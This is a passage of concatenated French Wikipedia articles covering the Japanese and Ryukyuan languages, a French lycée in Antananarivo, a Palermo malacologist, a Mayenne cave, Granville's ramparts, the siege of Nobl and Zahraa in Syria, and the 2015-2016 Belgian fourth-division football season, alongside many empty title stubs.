Ce dernier s'insère dans la famille linguistique « japonique », laquelle regroupe aussi les différents dialectes dérivant du japonais dit « standard » et les langues ryūkyū, qui forment leur propre catégorie appelée "ryukyuen", étant différentes du japonais.
La société japonaise est linguistiquement très uniforme avec 98,2 % de la population ayant le japonais pour langue maternelle. Les 1,8 % restants étant constitués principalement de populations d’immigrants venus de Corée () et de Chine (), ainsi que de Vietnamiens, de Brésiliens, d’Américains (), d’Européens ().
Il existe d'autres langues japoniques sur les îles Ryūkyū, appelées langues ryūkyū, la plus connue étant l’okinawaïen. Ces îles (environ 90) se trouvent entre le Japon et Taïwan. Elles regroupent la préfecture d'Okinawa et les îles de Kyushu. «Si la reconnaissance du ryukyuen comme langue distincte du japonais est aujourd'hui admise par les linguistes, elle est assez récente. Le grand public et les médias japonais actuels, ainsi que les travaux scientifiques un peu anciens, parlent généralement de « dialectes Ryukyu », entérinant ainsi l'idée que les parlers Ryukyu seraient des dialectes du japonais au même titre que le japonais d'Osaka, de Tokyo ou de Kagoshima.» (Labrune, 2013)L’aïnou de Hokkaidō est toujours parlé à l’intérieur de la communauté du peuple autochtone mais reste néanmoins en voie de disparition (quelque ).

</doc>
<doc id="8979671" url="https://fr.wikipedia.org/wiki?curid=8979671" title="Bertrand de Beauvoir">
Bertrand de Beauvoir



</doc>
<doc id="8979673" url="https://fr.wikipedia.org/wiki?curid=8979673" title="Ennemis non-identifiés">
Ennemis non-identifiés



</doc>
<doc id="8979675" url="https://fr.wikipedia.org/wiki?curid=8979675" title="Funès">
Funès



</doc>
<doc id="8979677" url="https://fr.wikipedia.org/wiki?curid=8979677" title="Lycée français de Tananarive">
Lycée français de Tananarive

Le lycée français de Tananarive (LFT), fondé en 1972, est un établissement d'enseignement français situé dans le quartier Ambatobe de la capitale de Madagascar. Il constitue depuis 1990 (création de l'AEFE) un établissement en gestion directe (EGD) de l'Agence pour l'enseignement français à l'étranger.
Caractéristiques.
Le LFT offre toutes les classes de collège et lycée et quatre écoles primaires françaises (EPF) lui sont rattachées :
Le lycée offre aux collégiens et lycéens venus d'autres régions de l'Île un internat de 250 places rénové en 2013 et un restaurant scolaire ouvert aux pensionnaires et aux demi-pensionnaires. Les équipements sportifs comportent notamment une piscine de 25 m de long, un stade de football, une piste d'athlétisme de 400 m, un mur d'escalade, un gymnase, une salle de musculation, deux terrains de volley-ball et quatre terrains de basket-ball.
Il compte sur son site principal (second degré) 60 classes (moitié niveau collège, moitié niveau lycée), soit environ élèves sur un terrain de quelque appartenant à l'État français.
Les filières proposées en second cycle sont la voie générale, la voie technologique (série STMG) et la voie professionnelle (spécialité gestion et administration). Le lycée dispose d'une section européenne et prépare l'option internationale du baccalauréat.
Établissement mutualisateur.
Le lycée français de Tananarive a un rôle régional de mutualisation pour l'AEFE, notamment en ce qui concerne la formation continue des personnels enseignants (premier et second degré), personnels administratifs, techniques et de service.
Historique.
Le LFT a commencé à fonctionner le au matin. C’était alors le premier lycée français post-colonial d’Afrique (hors Maghreb), créé sur le modèle de ceux de Rome ou de Washington par Jacques Degui, qui restera proviseur jusqu’en 1977. Il est d'abord installé dans l'ancien petit séminaire catholique d’Ambatoroka. En 1998, il change de site pour s'installer dans le quartier d'Ambatobe.

</doc>
<doc id="8979678" url="https://fr.wikipedia.org/wiki?curid=8979678" title="Gellibert des Seguins">
Gellibert des Seguins



</doc>
<doc id="8979681" url="https://fr.wikipedia.org/wiki?curid=8979681" title="Tommaso di Maria Allery Monterosato">
Tommaso di Maria Allery Monterosato

Tommaso di Maria Allery Monterosato est un malacologiste italien, né le à Palerme et mort le à Palerme.
Biographie.
Il est devenu un éminent spécialiste des mollusques de la Méditerranée, apprécié par les étudiants en malacologie du monde entier.
Compte tenu de sa réticence à la recherche sur le terrain, il a recueilli une quantité considérable de spécimens à étudier, en collaboration avec d'autres chercheurs. Au cours de ses nombreux voyages en Italie et à l'étranger, il a gardé de nombreux contacts avec de célèbres malacologues .
Sa production scientifique était d'une importance considérable. Il a décrit de nombreuses nouvelles espèces, a énuméré les coquilles de la Méditerranée et a étudié les gisements de fossiles du Mont Pellegrino.
Une partie de ses collections se situe au Musée des Sciences de Laval.

</doc>
<doc id="8979682" url="https://fr.wikipedia.org/wiki?curid=8979682" title="Homosexualité masculine">
Homosexualité masculine



</doc>
<doc id="8979683" url="https://fr.wikipedia.org/wiki?curid=8979683" title="Karali">
Karali



</doc>
<doc id="8979684" url="https://fr.wikipedia.org/wiki?curid=8979684" title="Laroche-Joubert">
Laroche-Joubert



</doc>
<doc id="8979685" url="https://fr.wikipedia.org/wiki?curid=8979685" title="Lycée français d'Antananarivo">
Lycée français d'Antananarivo



</doc>
<doc id="8979686" url="https://fr.wikipedia.org/wiki?curid=8979686" title="Lefebvre (orgue)">
Lefebvre (orgue)



</doc>
<doc id="8979688" url="https://fr.wikipedia.org/wiki?curid=8979688" title="Lefèvre-Pontalis">
Lefèvre-Pontalis



</doc>
<doc id="8979689" url="https://fr.wikipedia.org/wiki?curid=8979689" title="Lemaigre-Dubreuil">
Lemaigre-Dubreuil



</doc>
<doc id="8979691" url="https://fr.wikipedia.org/wiki?curid=8979691" title="Lépine (orgue)">
Lépine (orgue)



</doc>
<doc id="8979692" url="https://fr.wikipedia.org/wiki?curid=8979692" title="Magen">
Magen



</doc>
<doc id="8979695" url="https://fr.wikipedia.org/wiki?curid=8979695" title="Masreliez">
Masreliez



</doc>
<doc id="8979697" url="https://fr.wikipedia.org/wiki?curid=8979697" title="UC AlbinoLeffe">
UC AlbinoLeffe



</doc>
<doc id="8979698" url="https://fr.wikipedia.org/wiki?curid=8979698" title="Norgeu">
Norgeu



</doc>
<doc id="8979699" url="https://fr.wikipedia.org/wiki?curid=8979699" title="Roulleaux-Dugage">
Roulleaux-Dugage



</doc>
<doc id="8979700" url="https://fr.wikipedia.org/wiki?curid=8979700" title="Thureau-Dangin">
Thureau-Dangin



</doc>
<doc id="8979702" url="https://fr.wikipedia.org/wiki?curid=8979702" title="Grotte de la Roche (Louverné)">
Grotte de la Roche (Louverné)

La grotte de la Roche est une grotte ornée située à Louverné, en Mayenne, dans les Pays de la Loire. Elle est propriété de Laval Agglomération depuis 2010, et sous la gestion du Musée des sciences de Laval. La grotte a été occupée par l'homme au Paléolithique supérieur.
Historique.
La grotte de Louverné a été fouillée pour la première fois en 1872 par le préhistorien Jules Le Fizelier. Des fouilles plus approfondies ont été menées en 1873 par le géologue et conservateur du Muséum d’histoire naturelle de Laval, Daniel Œhlert, et le propriétaire de la grotte, Ernest Perrot.
Un sondage et des fouilles menées par Dominique Marguerie en 1982 n'ont pas permis de recueillir suffisamment de matériel pour l'attribuer à une industrie lithique précise (Bigot, 2001). 
Description.
La grotte possède une grande salle dont les fouilles ont montré qu'elle était occupée par les hommes de la Préhistoire. Des réseaux secondaires plus ou moins colmatés débouchent en paroi, constituant ainsi d'autres entrées, dont la plus haute est appelée "cheminée" (Gaudry, 1873).
Vestiges.
Les fouilles de 1872-1873 ont livré quelques restes fossiles de mammifères (plusieurs canines de renard roux, une molaire de rhinocéros laineux, des canines et des dents carnassières de hyène des cavernes, de nombreux bois de jeunes rennes ainsi que d’un individu adulte, des dents et des os de cheval sauvage, et des dents et os de grands mammifères du genre Bos), quatre dents humaines, des morceaux de charbon et de cendre, des outils de silex et un fragment de bois de renne scié pour en extraire une baguette.
Aménagements.
Les fouilles anciennes ont permis la découverte de restes humains, notamment quatre molaires et un humérus brisé, engagé dans une couche de cendreuse. Des pierres posées avec symétrie, formant une espèce de dallage, ainsi qu'un foyer situé à 12 m de l'entrée ont été mis au jour (Oehlert, 1882).
Gravures pariétales.
En 2010, le préhistorien Romain Pigeaud découvre des gravures pariétales préhistoriques.
Conservation.
Les vestiges fossiles et archéologiques découverts dans la grotte sont conservés au Musée des sciences de Laval.

</doc>
<doc id="8979703" url="https://fr.wikipedia.org/wiki?curid=8979703" title="Enceinte de Granville">
Enceinte de Granville

Lenceinte de Granville, ou enceinte de la Haute-Ville, correspond à l'enceinte urbaine enserrant la Haute Ville de Granville dans le département français de la Manche, en région Normandie. Les fortifications sont protégées au titre des monuments historiques.
Localisation.
L'ensemble, délimitant la Haute Ville et qui s'étend sur , est situé sur le cap Lihou, une étroite presqu'île rocheuse qui s'avance dans la mer, à l'ouest de la commune de Granville, dans le département français de la Manche.
Historique.
Les remparts de la Haute Ville furent bâtis à partir de 1439 par les Anglais. C'est Thomas de Scales, chef anglais, qui après avoir acquis la position de Jean d’Argouges, la rendit forte en coupant l'isthme étroit par un profond fossé taillé dans le roc, et fit bâtir au centre une citadelle ainsi que l'église Notre-Dame. En 1442, Louis d'Estouteville, les en chassera avant que les travaux soient finis. C'est qui augmentera et finira les fortifications.
Les fortifications furent démolis en 1689 sur ordre de Louvois. Vers 1695, craignant une attaque anglaise, on construisit toutefois une redoute sur le Roc, telle que l'avait projetée Vauban. L'enceinte fut par la suite relevée entre 1727 et 1749, et remaniée de 1815 à 1840. 
Description.
Il ne subsiste rien des remparts du , seul subsiste entre autres de l'époque de la reconstruction vers 1695 : la Grand-Porte avec son pont-levis, ainsi que le logement au-dessus, dit Logis du Roi où habitait le gouverneur de Granville, et la porte Saint-Jean. À noter que la pointe ouest du roc ne fut pas fortifiée et est restée dénudée, alors qu'à l'est , le « roc » a été isolé du plateau par une profonde tranchée creusée par les Anglais.
De la même façon, il ne reste rien de la citadelle construite au centre. Celle-ci avec l'église Notre-Dame représentait un carré de de côté. Ses fondations furent misent au jour en 1835, rue Saint-Michel, à une vingtaine de mètres à l'ouest de l'ancienne mairie.
Le plan de Gomboust daté de 1650 nous indique le tracé de l'enceinte qui devait comprendre l'église Notre-Dame et s'étendre jusqu'à l'isthme. En 1686, Vauban décrit la place : .
L'enceinte principale a quant à elle été rasée en 1911 afin de faciliter l'accès à la plage du Casino. Le réduit, la fortification bizarre de Vauban et la braie (le rempart moins élevé) furent détruits au et servirent à combler le grand fossé.
Protection.
Au titre des monuments historiques : 

</doc>
<doc id="8979704" url="https://fr.wikipedia.org/wiki?curid=8979704" title="Toupot de Bévaux">
Toupot de Bévaux



</doc>
<doc id="8979705" url="https://fr.wikipedia.org/wiki?curid=8979705" title="Enceinte de la Haute-Ville">
Enceinte de la Haute-Ville



</doc>
<doc id="8979706" url="https://fr.wikipedia.org/wiki?curid=8979706" title="Esplanade Nathalie Sarraute">
Esplanade Nathalie Sarraute



</doc>
<doc id="8979707" url="https://fr.wikipedia.org/wiki?curid=8979707" title="Siège de Nobl et Zahraa">
Siège de Nobl et Zahraa

Le siège de Nobl et Zahraa a eu lieu pendant la guerre civile syrienne. Il débute le , lorsque les deux petites villes de Nobl et de Zahraa, dont les populations sont à majorité chiite, commencent à être encerclées par les rebelles. L'encerclement n'est cependant pas complet, les positions à l'ouest étant tenues par les Kurdes des YPG. Le siège s'achève le , lorsque l'armée syrienne et les milices chiites appuyées par l'Iran et la Russie parviennent à percer les lignes rebelles à l'est et à faire leur jonction avec les assiégés.
Déroulement.
Les deux villages sont principalement défendus par les paramilitaires des Forces de défense nationale, le Hezbollah et deux milices chiites affiliées au Hezbollah qui sont formées spécifiquement à Nobl et Zahraa : Junud al-Mahdi, fondée en 2012, et Fawj al-Imam al-Hujja formé plus tardivement probablement en .
Le , le siège de la vieille ville de Homs prend fin. En échange de l'évacuation des combattants assiégés à Homs, les rebelles s'engagent à laisser passer une aide humanitaire et des vivres à Nobl et Zahraa. Un convoi d'approvisionnement fait route le vers ces deux localités, mais il est contraint de faire demi-tour à cause d'une intervention de combattants du Front al-Nosra. C'est finalement le , que l'approvisionnement arrive à Nobl et Zahraa.
Le , les rebelles lancent une offensive contre Nobl et Zahraa. Selon l'OSDH : . Les rebelles avancent depuis les villages de Mayir, Bayanoun et Tamoura, soutenus par huit chars et des pièces d'artillerie. Huit ou dix rebelles sont tués le premier jour, deux faits prisonniers, tandis que les habitants de Zahraa font état d'au moins deux civils tués et 19 blessés. Le , un kamikaze du Front al-Nosra se fait exploser à Zahraa tandis que les hélicoptères du régimes larguent deux barils. Le 30, un chef du Front al-Nosra est tué.
La nuit du 8 au , le Front al-Nosra et les rebelles lancent un nouvel assaut. Soutenus par sept chars, ils parviennent à s'emparer de quelques rues au sud de Zahraa et de quelques bâtiments à Nobl. Cependant, les Forces de défense nationale contre-attaquent et repoussent les assaillants hors des deux villages. Selon l'OSDH, le combat a fait au moins 25 morts, dont 11 loyalistes et 14 rebelles. Les assaillants perdent également trois chars.
Le , des échanges de prisonniers s'effectuent sous la médiation des Kurdes des YPG. Puis le , à la suite d'une nouvelle médiation des Kurdes, les rebelles relâchent 10 femmes et 15 enfants de Nobl et Zahraa contre un de leurs chefs, nommé Youssef Zaw’ah.
Le , les miliciens reprennent la zone d'al-Ma’amel, au sud de Zahraa, prise en février par les rebelles. Les combats font au moins douze morts parmi les miliciens des Forces de défense nationale.
Le , une offensive est lancée au nord d'Alep par de l'armée arabe syrienne, des Forces de défense nationale, du Hezbollah libanais, des Brigades Badr, des Kataeb Hezbollah, du Harakat Hezbollah al-Nujaba, de la Brigade des Fatimides, de la Force Al-Qods et d'unités de l'armée iranienne, appuyés par les spetsnaz et l'aviation russe. Le , les assiégés font une sortie et les loyalistes font leur jonction à Maaraset al-Khan. Le siège de Nobl et Zahraa est brisé et les renforts sont accueillis par une foule en liesse. Avec cette avancée, les loyalistes coupent par la même occasion la route d'approvisionnement des rebelles au nord d'Alep et remportent une grande victoire stratégique dans la province. L'offensive fait des centaines de morts dans les deux camps, dont 24 soldats de l'armée iranienne et 3 miliciens afghans.

</doc>
<doc id="8979708" url="https://fr.wikipedia.org/wiki?curid=8979708" title="Enceinte de la Haute Ville">
Enceinte de la Haute Ville



</doc>
<doc id="8979712" url="https://fr.wikipedia.org/wiki?curid=8979712" title="Championnat de Belgique de football de quatrième division 2015-2016">
Championnat de Belgique de football de quatrième division 2015-2016

Le Championnat de Belgique de football D4 2015-2016 est la soixante-quatrième édition du championnat de Promotion (D4) belge.
Une page d'histoire se tourne à l'occasion de cette saison et de la réforme votée le et mise en œuvre en vue de la compétition 2016-2017. Ce championnat est le dernier de la "Promotion" sous ce vocable et sous la forme qui est la sienne depuis 1952.
À partir de la saison suivante, le ne comptera plus que 48 formations réparties en trois séries régionalisées (32 clubs néerlandophones et ophones/germanophones). Cette nouvelle mouture du Niveau 4 devrait prendre le nom de Division 2 Amateur.
Cette "dernière" se clôture avec trois "premières" car le Knokke FC (A), le RC Hades (C) et le FC Meux (D) décrochent leur tout premier titre en séries nationales.
À l'issue de la phase classique, des tours finaux sont organisés mais de manière distincte selon que les clubs appartiennent à l'aile francophone (ACFF) ou néerlandophone (VFV) de la fédération belge.
Réforme des championnats.
Terminologie, entre esprit et fait.
La terminologique de l'URBSFA ne fait pas mention des séries régionales au sens strict du terme, ni même dans un premier temps de séries régionalisées, même si dans les faits elles sont composées comme telles.
Malgré la création d'ailes linguistiques quelques années plus tôt, la Fédération belge tient à son unitarisme national et parle d'une "répartition géographique". Les ailes linguistiques ne sont que des sections administratives. Les futures D2 et D3 Amateur sont donc des ligues "nationales régionalisées" ou "scindées géographiquement". Tout est une question d'interprétation.
En Belgique, dans d'autres sports d'équipes par contre, comme le Basket ou le Volley, on parle bien de "Séries Régionales", car assujetties à des fédérations régionales comme l"Association Wallonie-Bruxelles de Basket-ball" (AWBB) ou la "Fédération Interprovinciale de Volley-ball" (FIVB) qui ont leur pendant flamand. La Ligue nationale ne gérant plus que les séries nationales et la sélection nationale.
Division 2 Amateur.
Le ne comptera plus que trois séries de 16 équipes, au lieu de quatre séries précédemment. Deux de ces "poules" seront composées de clubs géographiquement situés en Région flamande et la troisième avec des formations du reste du pays.
Composition en vue de 2016-2017.
Les 48 clubs appelés à créer la "Division 2 Amateur" sont :
La "politique" fait son entrée.
Pour la première fois depuis 1895, la politique fait son entrée dans la structure pyramidale car la composition de séries est influencée par la situation géographique des clubs et/ou leur appartenance linguistique dans le cas des cercles brabançons et bruxellois.
Division 3 Amateur.
Pour la première fois depuis 1895, un hiérarchique apparaît dans la pyramide du football belge, au-dessus des séries provinciales.
Ce niveau 5 sera composé de 64 formations réparties en quatre séries de 16 ("comme l'actuelle "Promotion""). Deux séries sont réservées aux clubs néerlandophones et deux séries sont attribuées à des clubs francophones et/ou germanophones.
Composition en vue de 2016-2017.
À noter que pour la saison 2016-2017, les deux séries francophones de "Division 3 Amateur" ne compteront que 14 équipes chacune puis passeraient à 16 en 2017-2018. Ce choix a été posé afin d'éviter de devoir promouvoir un trop grand nombre de cercles issus des provinces francophones/germanophones.
"Promotion"...disparition ?
Le terme historique de "Promotion" employé depuis 1909 lors de la création du national, serait appelé à disparaître selon les informations actuellement disponibles. Mais il ne s'agit pas encore d'une affirmation. La "D3 Amateur", telle que décrite jusqu'à présent, pourrait conserver le nom de "Promotion".
P1, "niveau 6".
Une des conséquences de cette réforme si elle devait être appliquée telle quelle équivaut donc à faire reculer d'un niveau les Divisions provinciales. La "P1" devenant "niveau 6", la '"'niveau 7", et ainsi de suite.
Organisation - Réglementation.
Les clubs participants sont ventilés en quatre séries selon des critères géographiques. Une convention veut que dans la mesure du possible une même poule comprennent des équipes venant de deux provinces différentes.
Les quatre groupes ont une valeur identique quelle que soit leur appellation (A", "B", "C" ou "D).
Le dernier de chaque série est relégué en Division 1 de leur province (P1).
Au sein d'une même série, les clubs se rencontrent par matchs aller/retour. Cela donne un total de 30 journées et autant de matchs joués par chaque formation.
La première ébauche du règlement prévoit que les trois premiers classés de chaque série gagnent le droit de rejoindre la nouvelle "Division 2 Amateur" et donc de rester au niveau.
Les trois derniers classés des séries "A" et "C", ainsi que le dernier classé des séries "B" et "D" est relégué en "P1" de sa province d'appartenance.
Les autres formations composent la base de la nouvelle "Division 3 Amateur" (Niveau 5).
Cas particulier.
En vue d'obtenir 16 clubs francophones pour composer la série qui leur est réservée en "Division 2 Amateur", un certain nombre de clubs francophones et/ou germanophone seront repêchés. Les modalités de ce repêchage n'ont pas encore été rendues publiques.
Remarques préliminaires.
Fusion/Union à Wetteren.
À la fin , on apprend que le Royal Racing Club Wetteren-Kwatrecht et le Koninklijke Standaard Wetteren ont choisi de s'unir pour n'aligner qu'une seule équipe en Promotion ("sous le matricule 95 de « Racing »") en vue de la saison 2015-2016. Le nom de "Racing Standaard Wetteren" devrait être choisi pour désigner la formation qui évoluera sous le matricule 95. C'est du moins ce que l'on croit pendant un temps. Mais au tout début du mois de , le nom de "K. FC Wetteren" fait son apparition. Finalement, le conseil de gestion de la nouvelle entité choisit de conserver le terme « Royal » qui était celui du matricule 95 et on a donc la constitution du Royal Football Club Wetteren (matricule 95).
Reconstitution d'un RWDM.
Initialement le matricule 5479 du "Standaard" restait actif avec des équipes de jeunes de ce club. Mais début mai, le matricule 5479 est cédé à des investisseurs qui ont pour projet de recréer un club dénommé "Racing White Daring de Molenbeek (RWDM)".
Les initiateurs du projet souhaitent évoluer au stade Machens de Molenbeek. Mais de longues négociations sont nécessaires en raison de la position assez neutre des responsables communaux et d'une volonté de blocage émanant de la direction du White Star Bruxelles, club de Division 2 et résidant du stade lors des 2 saisons précédentes: et. En date du , un jugement est rendu dans l'affaire d'attribution de terrain. Le RWDM se verra récompensé et jouera sur le terrain A du stade Edmond Machtens. Le retour à leur stade mythique.
Disparitions de clubs.
Anticipativement, on considérait que deux cercles wallons, le R. CS Visé ("matricule 369") et le R. Géants Athois ("matricule") allaient disparaître. En définitive, le "matricule 2899" des Géants Athois a été cédé à des investisseurs français, mais un autre club se retrouve radié par la fédération belge: le R. CS Verviétois.
R. CS Verviétois.
La crainte était réelle mais les responsables du club se voulaient rassurants. Mais le samedi , la nouvelle tombe en fin d'après-midi, le R. CS Verviétois, porteur du "matricule 8", est radié pour non-respect du délai de paiement d'arriérés à deux de ces anciens joueurs, Frédéric Tutta et Marco Ingrao.
Connaissant des soucis financiers depuis plus d'une vingtaine d'années, le deuxième plus ancien club wallon encore en activité était passé à côté de la disparition et avait su survivre à diverses faillites grâce à plusieurs plans de sauvetage.
Le club lainier s'était lui-même en cessation de paiement le afin de redémarrer une nouvelle ASBL et sauvegarder la pérennité du club. Cependant deux dettes pour un montant total estimé à eurent raison des efforts des "Béliers".
Aucune preuve de paiement ne lui étant parvenu, l'URBSFA a prononcé, lors de son Assemblée Générale du , la radiation du club. Celui-ci s'est pourvu en appel pour contester la validité de la radiation considérant ne pas avoir été averti correctement de l'ordre du jour de la susdite AG. Une réunion s'est déroulée le lundi dans les locaux de l'Union Belge mais le lendemain, la radiation a été confirmée.
Conséquence immédiate de la radiation, le club du Patro Lensois a été officiellement repêché pour prendre part au prochain championnat de "Promotion". De son côté, le R. CS Verviétois a annoncé son intention de saisir le tribunal civil.
R. Géants Athois.
Constitué le par la fusion de la "R. JS Ath-Maffle" ("matricule 2899") - - avec le "FC Ath Sport" ("matricule 9435"). L'entité n'aura donc vécu que onze ans. Le club grandit vite, trop vite. Après cinq ans, le matricule 2899 atteint les séries nationales et en deux saisons gagne sa place en Division 3.
La concurrence, les luttes internes et le contexte particulier du football belge où règne une terrible inflation des salaires, minent le club qui se retrouve exsangue financièrement à l'entame de la saison 2014-2015, durant laquelle on a un triste épisode où les joueurs de l'équipe "A" font grève durant une semaine pour réclamer leurs arriérés de salaire. Conscients que le dépôt de bilan est proche, les dirigeants du matricule 2899 se tourne vers un petit club de l'entité, le FC Ostiches ("matricule 9245") qui milite en "P1" hennuyère. Une union - est entérinée, confirmant la disparition des "Géants Athois" et de leur matricule 2899.
La place laissée libre en "Promotion" devrait revenir à un cercle du Hainaut, en l'occurrence le R. Albert Quevy-Mons ("matricule 4194"), finaliste malheureux du TF de Hainaut et vice champion au terme de la saison régulière.
Le , on apprend que des investisseurs français ont conclu un accord afin de reprendre le matricule 2899 qui continue donc son existence. Arrivé à la mi-juillet, les choses s'éclaircissent. La presse sportive belge présente celui qui serait le repreneur: l'ancien international français Nicolas Anelka. Si le club ne changera officiellement ne nom qu'en vue de la saison 2016-2017, l'équipe n'évoluera plus à Ath, mais à Fleurus.
Portant toujours le nom officiel de "R. Géants Athois" vis-à-vis de la fédération, l'équipe A déclare forfait pour la première rencontre de championnat à Sterrebeek mais s'aligne dès la au R.W.D.M. Peu après sa première journée à domicile, un litige survient avec les responsables du site de Fleurus et le club déménage vers Renaix.
Forfait général !
Alors que le premier tour touche à sa fin, on apprend que le club jette l'éponge le . Une semaine plus tard, la fédération prononce le forfait général. Tous ses matchs (dans la "Série B") sont annulés.
R. CS Visé.
Le R. CS Visé a été déclaré en faillite au mois d'octobre 2014. De nombreuses démarches et négociations ont eu lieu pour tenter d'assurer la pérennité vieux cercle de la Cité de l'Oie, mais le constat affligeant est là: aucune solution fiable n'a été trouvée.
Dans un premier temps, une piste "chinoise" a été évoquée. Elle est soutenue entre autres par l'ancien joueur professionnel Sunday Oliseh. Mais le lourd passif (on parle d'une somme de 1 à 2 millions d'euros) ainsi que des luttes sous le manteau ont fait...capoté tout projet. Le , on apprend qu'un des curateurs et ancien joueur professionnel Maitre Laurent Stas De Richelle a envoyé un courrier à l'URBSFA déplorant l'absence de solution et l'arrêt des activités de l'équipe "A".
Après des rêves de "Division 1", lors d'une reprise par des investisseurs indonésiens le matricule 369 avait vu partir ceux-ci, après qu'ils eurent effacer le passif. Un groupe anglais, représenté par l'ancien international Terry Fenwick arrive alors mais au terme d'un an et demi d'activité un trou béant dans les finances met en péril l'avenir du club. Relégué de "D2" en "D3", le cercle connaît la faillite évoquée ci-dessus et chute en "Promotion".
Le remplacement du R. CS Visé en "Promotion" devrait revenir au R. CS Verlaine, finaliste malheureux du TF de liégeoise et vice champion au terme de la phase classique. Si cela se concrétise, ce cercle porteur du "matricule 2871" fera un grand retour en séries nationales après 68 ans d'absence !
Du côté de la Cité de l'Oie, le stade du même nom sera désormais partagé entre le FC Richele United, promu en "Promotion" en 2015 et lURS Lixhe-Lanaye, promu en "P2". Ce club est soutenu par le dénommé Guy Thiry, ancien président...du R. CS Visé.
SW Harelbeke blanchi en appel.
Le Sporting West Harelbeke était sous le coup d'une sanction induisant un renvoi en "P1" pour "tentative de falsification de compétition". Le club a interjeté appel de cette sanction. Sa présence est donc toujours sous réserves. Si le "matricule 1574" devait être relégué son remplaçant serait la Jong Lede ("si décision AVANT le "), un repêché du Tour final interprovincial("si décision APRES le ") (Voir saison précédente).
En appel, le matricule 1574 a été blanchi par l'URBSFA et peut donc poursuivre sa route en "Promotion".
Namur en danger ?
Début , une information confirme les craintes formulées depuis plusieurs semaines concernant l'UR Namur. Le club pourrait être mis en liquidation en raison d'un passif trop important. Initialement, il était question d'une "mise en liquidation volontaire" demandée par l'ASBL "Les Merles", gérant le club. Mais il semblerait que cette faillite pourrait imposée par le Tribunal de Commerce. L'avenir du "matricule 156" est une nouvelle fois fort incertain.
Un transfert de patrimoine est opéré vers une nouvelle entité, alors que les dettes fédérales sont suffisamment apurées. Le club peut poursuivre ses activités, mais n'est pas à l'abri d'une sanction ("qui le cas échéant n'interviendra que dans le courant de la saison 2016-2017") si la "cession de patrimoine est jugée punissable" par la fédération.
Clubs participants.
Soixante-quatre clubs prennent part à cette édition, soit le même nombre que lors de la saison précédente. Les clubs sont répartis en quatre séries de 16 équipes, selon des critères géographiques et provinciaux.
Série B.
Les R. Géants Athois et surtout leur "matricule 2899" n'a pas été radié comme pressenti et est annoncé repris par l'ancien international français Nicolas Anelka. L'appellation du club ne peut plus changer officiellement avant la saison 2016-2017. Il ne jouera plus à Ath mais au "stade Cosse" de Fleurus. Cependant, après quelques semaines de compétition, le club ne trouve plus d'accord avec les responsables des terrains occupés et choisit de déménager vers...Renaix.
Un groupe d'investisseurs a racheté le "matricule 5479" du désormais ex-Standaard Wetteren avec la volonté de relancer un club dénommé « Racing White Daring de Molenbeek » et de le faire jouer au stade Machtens de Molenbeek. L'Assemblée Générale de l'URBSFA du 27/06/2015 accepte le changement d'appellation.
Localisation Série B.
BruxellesGAN = FC GanshorenLÉO = R. Leopold Uccle FCRWDM = Racing White Daring de Molenbeek Le matricule "2899" (RGA) joue un match à Fleurus, puis déménage vers Renaix.
Série C.
Localisation Série C.
AbréviationsStL = K. FC St-LenaartsVos = K. VV VosselaarZwL = K. FC Zwarte Leeuw
Série D.
Le R. CS Verviétois ("matricule 8") qui descend de Division 3 est radié en raison d'une dette ("de 38.000 euro envers deux joueurs") non apurée.
Le R. CS Visé, déclaré en faillite durant la saison précédente, a été relégué en "Promotion", mais n'est pas en mesure de poursuivre ses activités en raison d'un passif trop important qui fait échouer les tentatives de reprises.
Résultats et Classements.
Précision: 
Série A.
Résumé - Série A.
Les promus du SC Dikkelvenne (22) réussissent une entame parfaite avec 7 victoires consécutives puis un partage et occupent fort logiquement la tête. Harelbeke (21) est le premier poursuivant. En bas de grille, deux autres montants, Adinkerke (2) et Damme (1) attendent encore leur premier succès après huit rencontres.
Au tournant du premier tiers de compétition, Dikkelvenne (25) reste leader mais a lâché du lest avec un premier revers ("1-2") des œuvres du Knokke FC (19). SW Harelbeke (23) est un solide premier poursuivant alors que Berlare (19) s'accroche au trio de tête. Longtemps en perdition, Damme (8) remporte deux succès, dont un à Ingelmunster ("0-1"), qui lui permettent de se donner de l'air. C'est Eernegem (4) qui se retrouve dernier, car Adinkerke (6) obtient une première victoire ("1-4") à St-Gillis/Waas (7).
Changement de leader au terme de la journée . SW Harelbeke (26) profite de sa victoire ("0-2") à OMS Ingelmunster pour dépasser Dikkelvenne (25) qui subit une seconde défaite de rang ("3-1") à Ninove.
Nouveau rebondissement lors des et journées, avec deux défaites consécutives d'affiliée pour Harelbeke, contre Damme ("0-2") d'abord, face au SC Dikkelvenne ("0-4") ensuite. Celui-ci reprend la tête. Grâce à une meilleure différence de buts, Knokke s'est glissé à la deuxième place, alors que le VK Westhoek est revenu au quatrième rang.
Westhoek poursuit sa remontée et s'empare de la première place et du titre honorifique de "champion d'automne", devant Dikkelvenne et Harelbeke, alors que Knokke marque légèrement le pas. Ceux-ci ont dû baisser pavillon devant l'Eendracht Zele, laquelle après un départ moyen, réalise un 12 sur 12 lors des deux dernières rencontres du premier tour et les deux premières du second. En fin de grille, c'est Eernegem qui est relégable 3 points derrière St-Gillis/Waas et 4 unités plus bas que les promus d'Adinkerke et de Damme.
Un trio s'affirme.
À la mi-, Westhoek (38) ("0 sur 12") a perdu de sa superbe et a glissé au rang. Dikkelvenne (45) a repris la tête, devant Harelbeke (41) et Knokke (39).
Deux semaines plus tard, malgré un revers ("1-3") contre Berlare, lors de la journée, le SC Dikkelvenne (48) reste leader devant SW Harelbeke (47) alors que Knokke FC (45) est le troisième d'un trio de tête qui s'affirme. Les premiers poursuivants sont Berlare et Zele (41) qui se neutralisent ("2-2") lors de la journée suivis de Westhoek (39). En fond de grille, la situation reste étroite de Sint-Gillis/Waas (17) à la lanterne rouge Adinkerke (14) séparés par Damme et Eernegem (15).
Lors de la journée, le , Knokke (48), vainqueur ("2-0") de Dikkelvenne (50), effectue la bonne opération d'autant qu'Harelbeke (50) est battu à Ninove ("2-0"). Parmi les premiers poursuivants, victorieux de Renaix ("1-0"), Berlare (47) reprend la place à Zele (44), défait à Menin ("2-0").
Cinq candidats, trois menacés.
À deux journées de la fin, on note une hésitation des meneurs qui perdent des plumes et permettent à deux formations de rester en mesure de briguer la qualification directe pour la "D2 Amateur".
